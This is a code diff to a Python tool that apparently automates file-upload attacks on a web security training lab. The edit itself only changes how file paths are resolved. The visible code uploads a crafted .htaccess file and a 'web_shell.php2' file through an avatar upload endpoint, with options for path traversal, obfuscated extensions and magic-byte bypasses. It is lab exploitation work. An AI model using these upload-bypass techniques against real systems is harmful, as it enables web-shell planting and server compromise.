@@ -20,6 +20,7 @@ import json
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 dotenv.load_dotenv(dotenv_path="../.env")
+PROJECT_ROOT = Path(__file__).parent.parent.resolve()
 
 
 is_proxy = "false" # change this to true if you want to use proxy ;)
@@ -32,7 +33,7 @@ proxy = {
 class FileUpload: 
     def __init__(self, url):
         self.url = url.rstrip("/")
-        self.file_location = ""
+        self.file_location = PROJECT_ROOT / os.getenv('FILE_TO_UPLOAD')
         self.file_name = ""
         self.session = requests.Session()
 
@@ -57,9 +58,9 @@ class FileUpload:
         
     def file_upload(self, csrf, content_type=None, path_traversal=False, obsfucated_extension=False, magic_byte=False):
         if magic_byte:
-            self.file_location = os.getenv('MAGIC_BYTE_FILE')
+            self.file_location = PROJECT_ROOT / os.getenv('MAGIC_BYTE_FILE')
         else:
-            self.file_location = os.getenv('FILE_TO_UPLOAD')
+            self.file_location = PROJECT_ROOT / os.getenv('FILE_TO_UPLOAD')
         if not self.file_location:
             print(f"The file to be uploaded is not set in the environment. Be sure to set the environment correctly. ദ്ദി ˉ͈̀꒳ˉ͈́ )✧")
             return None
@@ -185,12 +186,12 @@ class FileUpload:
             'user':'wiener'
         }
         try:
-            with open(os.getenv("HTACCESS_FILE", "rb")) as f:
+            with open(PROJECT_ROOT / os.getenv("HTACCESS_FILE", "rb")) as f:
                 htaccess = {
                     "avatar": (".htaccess", f)
                     }
                 htaccess_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=htaccess, verify=False)
-            with open(os.getenv("FILE_TO_UPLOAD"), "rb") as f:
+            with open(PROJECT_ROOT / os.getenv("FILE_TO_UPLOAD"), "rb") as f:
                 file = {
                     "avatar": ("web_shell.php2", f)
                 }
